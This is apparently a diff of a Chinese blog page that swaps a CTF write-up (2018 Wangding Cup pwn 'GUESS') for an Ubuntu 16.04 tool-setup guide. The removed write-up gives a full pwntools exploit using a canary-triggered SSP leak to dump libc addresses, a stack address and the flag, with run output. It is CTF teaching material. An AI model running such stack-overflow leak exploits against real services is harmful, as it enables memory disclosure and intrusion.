@@ -15,24 +15,17 @@
 
 
 
-<meta name="description" content="hint: libc基址泄露+flag泄露">
+<meta name="description" content="记录一下，方便以后虚拟机爆炸时重新配置。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2018网鼎杯pwn-GUESS">
-<meta property="og:url" content="http://yoursite.com/2019/03/04/2018网鼎杯pwn-GUESS/index.html">
+<meta property="og:title" content="从零开始的Ubuntu16.04配置">
+<meta property="og:url" content="http://yoursite.com/2019/04/15/从零开始的Ubuntu16-04配置/index.html">
 <meta property="og:site_name" content="4eriri&#39;s blog">
-<meta property="og:description" content="hint: libc基址泄露+flag泄露">
+<meta property="og:description" content="记录一下，方便以后虚拟机爆炸时重新配置。">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r4u9gwo2j30rw0oitdk.jpg">
-<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1g0r55df11yj30f801qt8x.jpg">
-<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcgy1g0r56yrwzaj31200hswjb.jpg">
-<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcgy1g0r5k5sxg6j30vm0t4aff.jpg">
-<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r5ooe7bpj31q00u0jxc.jpg">
-<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r5hhyg66j30ga01w74i.jpg">
-<meta property="og:updated_time" content="2019-03-04T15:19:04.079Z">
+<meta property="og:updated_time" content="2019-04-15T13:25:46.916Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2018网鼎杯pwn-GUESS">
-<meta name="twitter:description" content="hint: libc基址泄露+flag泄露">
-<meta name="twitter:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r4u9gwo2j30rw0oitdk.jpg">
+<meta name="twitter:title" content="从零开始的Ubuntu16.04配置">
+<meta name="twitter:description" content="记录一下，方便以后虚拟机爆炸时重新配置。">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -64,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>2018网鼎杯pwn-GUESS | 4eriri&#39;s blog</title>
+<title>从零开始的Ubuntu16.04配置 | 4eriri&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -196,11 +189,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-2018网鼎杯pwn-GUESS" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-从零开始的Ubuntu16-04配置" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/03/04/2018网鼎杯pwn-GUESS/" class="article-date">
-      <time datetime="2019-03-04T14:26:04.000Z" itemprop="datePublished">2019-03-04</time>
+      <a href="/2019/04/15/从零开始的Ubuntu16-04配置/" class="article-date">
+      <time datetime="2019-04-15T11:47:01.000Z" itemprop="datePublished">2019-04-15</time>
 </a>
 
 
@@ -215,7 +208,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      2018网鼎杯pwn-GUESS
+      从零开始的Ubuntu16.04配置
     </h1>
   
 
@@ -232,43 +225,43 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>hint: libc基址泄露+flag泄露</p>
+        <p>记录一下，方便以后虚拟机爆炸时重新配置。</p>
 <a id="more"></a>
-<p>开启了canary保护</p>
-<p>IDA观察一波：</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r4u9gwo2j30rw0oitdk.jpg" alt=""></p>
-<p>发现输入flag的地方有栈溢出，并且运行了一下发现一共可以输入3次，同时因为有fork的操作，所以即使第一次输入触发了canary，之后仍然可以进行第二第三次输入。</p>
-<p>这里利用<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=44069&amp;highlight=pwn" target="_blank" rel="noopener">SSP Leak</a>就可以泄漏libc基址和flag了。</p>
-<p>触发canary后，程序会以<code>%s</code>输出<code>__libc_main_argv[0]</code>，可以通过栈溢出覆盖到这个位置的，从而泄漏出想要泄漏的东西。</p>
-<p>使用gdb对程序进行调试，很方便就能得到该位置：</p>
-<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0r55df11yj30f801qt8x.jpg" alt=""></p>
-<p><code>__libc_main_argv[0]=0x7fffffffdde8</code></p>
-<p>在gets函数后下断点，对栈进行观察，找到输入在栈中的位置：</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0r56yrwzaj31200hswjb.jpg" alt=""></p>
-<p>这里我输入的是随便打的<code>tyuio</code></p>
-<p><code>input=0x7fffffffdcc0</code></p>
-<p>所以需要的填充为：<code>0x7fffffffdde8-0x7fffffffdcc0=296</code></p>
-<p>不知道libc版本的话，三次栈溢出貌似不太够用，所以我先泄漏了两个libc函数地址，手动找到了libc版本。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *sh=process(&quot;./GUESS&quot;)elf=ELF(&quot;./GUESS&quot;)puts_got=elf.got[&quot;puts&quot;]</span><br><span class="line">start_got=elf.got[&quot;__libc_start_main&quot;]</span><br><span class="line">sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(puts_got))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)puts_add=u64(sh.recv(6)+&quot;\x00\x00&quot;)</span><br><span class="line">print hex(puts_add)</span><br><span class="line">sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(start_got))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)start_add=u64(sh.recv(6)+&quot;\x00\x00&quot;)</span><br><span class="line">print hex(start_add)</span><br></pre></td></tr></table></figure>
-<p>一开始接受地址的时候，recv了8个字节，结果出了问题，从上面的栈图中也可以发现，64位程序内存的地址貌似最多只有6个字节，因此接受6个字节，再加2个<code>\x00</code>就可以了。</p>
-<p>运行得到两个libc函数的地址：</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0r5k5sxg6j30vm0t4aff.jpg" alt=""></p>
-<p>通过<a href="https://libc.blukat.me/?q=__libc_start_main%3A740%2Cputs%3A690&amp;l=libc6_2.23-0ubuntu10_amd64" target="_blank" rel="noopener">网站在线查询</a>可以得到libc版本（其实也可以用LibcSearcher这个库，但最近重装虚拟机还没弄好）：</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r5ooe7bpj31q00u0jxc.jpg" alt=""></p>
-<p>得到基址：<code>libc_base=puts_add-0x06f690</code></p>
-<p>为了泄漏flag，还要知道栈的地址。</p>
-<p>libc里有*environ指针指向栈地址，所以可以通过这个指针泄漏栈地址。</p>
-<p>在刚刚的网站可以查到_environ与libc基址之间的偏移。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">environ_add=libc_base+0x3c6f38sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(environ_add))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)stack_add=u64(sh.recv(6)+&quot;\x00\x00&quot;)</span><br></pre></td></tr></table></figure>
-<p>得到了栈地址之后，只要知道flag在栈中的偏移，就可以泄漏flag。</p>
-<p>通过gdb查看栈地址：</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r5hhyg66j30ga01w74i.jpg" alt=""></p>
-<p>计算flag在栈中偏移：</p>
-<p><code>0x7fffffffddf8-0x7fffffffdc90=360</code></p>
-<p>最终exp：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *sh=process(&quot;./GUESS&quot;)elf=ELF(&quot;./GUESS&quot;)puts_got=elf.got[&quot;puts&quot;]sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(puts_got))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)puts_add=u64(sh.recv(6)+&quot;\x00\x00&quot;)libc_base=puts_add-0x06f690environ_add=libc_base+0x3c6f38sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(environ_add))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)stack_add=u64(sh.recv(6)+&quot;\x00\x00&quot;)sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(stack_add-360))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)flag=sh.recvuntil(&quot;&#125;&quot;)print flag</span><br></pre></td></tr></table></figure>
-<p>运行结果：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parallels@parallels-vm:~$ python guess.py[+] Starting local process &apos;./GUESS&apos;: pid 22240[*] &apos;/home/parallels/GUESS&apos;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)[*] Process &apos;./GUESS&apos; stopped with exit code 0 (pid 22240)flag&#123;just4eriri&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h1><p>跳到更新源文件所在的目录下，终端执行：</p>
+<p><code>cd /etc/apt/</code></p>
+<p>此时，我们可以在当前目录看一下里面的文件，终端执行: ls   我们会看到当前目录下所有文件，不出意外 会有一个sources.list文件，这个文件里面写的就是更新源。我们接下来都是对它进行操作</p>
+<p>将原来的更新源备份一下，注意要用管理员权限进行操作，终端执行：</p>
+<p><code>sudo cp sources.list copy_sources.list</code></p>
+<p>此时，当前目录下会多一个copy_sources.list的文件，是我们自己的备份，万一我们把更新源改坏了，还可以恢复回来</p>
+<p>更换更新源，终端执行：</p>
+<p><code>sudo gedit sources.list</code></p>
+<p>然后复制想换的源进去保存就可以了</p>
+<p>阿里源：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># deb cdrom:[Ubuntu 16.04 LTS _Xenial Xerus_ - Release amd64 (20160420.1)]/ xenial main restricted</span><br><span class="line">deb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-properties</span><br><span class="line">deb http://archive.canonical.com/ubuntu xenial partner</span><br><span class="line">deb-src http://archive.canonical.com/ubuntu xenial partner</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse</span><br></pre></td></tr></table></figure>
+<p>更新源，终端执行：</p>
+<p><code>sudo apt update</code></p>
+<h1 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h1><p>终端执行：</p>
+<p><code>sudo apt install python-pip</code></p>
+<h1 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h1><p>终端执行：</p>
+<p><code>sudo apt install git</code></p>
+<h1 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h1><p>终端执行：</p>
+<p><code>sudo pip install pwntools</code></p>
+<h1 id="安装pwndbg"><a href="#安装pwndbg" class="headerlink" title="安装pwndbg"></a>安装pwndbg</h1><p>终端执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">sudo ./setup.sh</span><br></pre></td></tr></table></figure>
+<h1 id="安装z3"><a href="#安装z3" class="headerlink" title="安装z3"></a>安装z3</h1><p>终端执行：</p>
+<p><code>pip install z3-solver</code></p>
+<h1 id="安装open-cv"><a href="#安装open-cv" class="headerlink" title="安装open-cv"></a>安装open-cv</h1><p>终端执行：</p>
+<p><code>pip install opencv-python</code></p>
+<h1 id="安装angr"><a href="#安装angr" class="headerlink" title="安装angr"></a>安装angr</h1><p>终端执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pip install virtualenvwrapper</span><br><span class="line">export WORKON_HOME=$HOME/Python-workhome</span><br><span class="line">source /usr/local/bin/virtualenvwrapper.sh</span><br><span class="line">mkvirtualenv angr</span><br><span class="line">sudo pip install angr</span><br></pre></td></tr></table></figure>
+<h1 id="可能会出现的问题"><a href="#可能会出现的问题" class="headerlink" title="可能会出现的问题"></a>可能会出现的问题</h1><p>由于作死很多东西一起安装，忘记了哪一个会对pip版本作出修改，导致后面安装时可能会出现cannot import name main的问题</p>
+<p>终端执行：</p>
+<p><code>sudo gedit /usr/bin/pip</code></p>
+<p>将</p>
+<p><code>from pip import main</code></p>
+<p>改为</p>
+<p><code>from pip._internal import main</code></p>
+<p>保存即可</p>
 
       
     </div>
@@ -277,13 +270,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/03/04/2018网鼎杯pwn-GUESS/">2018网鼎杯pwn-GUESS</a></p>
+        <p><span>本文标题:</span><a href="/2019/04/15/从零开始的Ubuntu16-04配置/">从零开始的Ubuntu16.04配置</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
-        <p><span>发布时间:</span>2019-03-04, 22:26:04</p>
-        <p><span>最后更新:</span>2019-03-04, 23:19:04</p>
+        <p><span>发布时间:</span>2019-04-15, 19:47:01</p>
+        <p><span>最后更新:</span>2019-04-15, 21:25:46</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/03/04/2018网鼎杯pwn-GUESS/" title="2018网鼎杯pwn-GUESS">http://yoursite.com/2019/03/04/2018网鼎杯pwn-GUESS/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/03/04/2018网鼎杯pwn-GUESS/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/04/15/从零开始的Ubuntu16-04配置/" title="从零开始的Ubuntu16.04配置">http://yoursite.com/2019/04/15/从零开始的Ubuntu16-04配置/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/04/15/从零开始的Ubuntu16-04配置/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -295,16 +288,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/03/12/32位程序调用64位代码/">
-                    调用64位代码的32位程序逆向
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/02/24/安恒杯2019年2月月赛/">
-                    安恒杯2019年2月月赛
+                <a href="/2019/04/15/DDCTF2019-Confused/">
+                    DDCTF2019-Confused
                 </a>
             </div>
         
@@ -316,7 +303,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#换源"><span class="toc-number">1.</span> <span class="toc-text">换源</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安装pip"><span class="toc-number">2.</span> <span class="toc-text">安装pip</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安装git"><span class="toc-number">3.</span> <span class="toc-text">安装git</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安装pwntools"><span class="toc-number">4.</span> <span class="toc-text">安装pwntools</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安装pwndbg"><span class="toc-number">5.</span> <span class="toc-text">安装pwndbg</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安装z3"><span class="toc-number">6.</span> <span class="toc-text">安装z3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安装open-cv"><span class="toc-number">7.</span> <span class="toc-text">安装open-cv</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安装angr"><span class="toc-number">8.</span> <span class="toc-text">安装angr</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#可能会出现的问题"><span class="toc-number">9.</span> <span class="toc-text">可能会出现的问题</span></a></li></ol>
         
     </div>
     <style>
@@ -352,7 +339,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"2018网鼎杯pwn-GUESS　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"从零开始的Ubuntu16.04配置　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -371,8 +358,8 @@
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://yoursite.com/2019/03/04/2018网鼎杯pwn-GUESS/';
-            this.page.identifier = '2019/03/04/2018网鼎杯pwn-GUESS/';
+            this.page.url = 'http://yoursite.com/2019/04/15/从零开始的Ubuntu16-04配置/';
+            this.page.identifier = '2019/04/15/从零开始的Ubuntu16-04配置/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -394,15 +381,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/03/12/32位程序调用64位代码/" title="上一篇: 调用64位代码的32位程序逆向">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/02/24/安恒杯2019年2月月赛/" title="下一篇: 安恒杯2019年2月月赛">
+            <a href="/2019/04/15/DDCTF2019-Confused/" title="下一篇: DDCTF2019-Confused">
                 <i class="fa fa-angle-right"></i>
             </a>
         
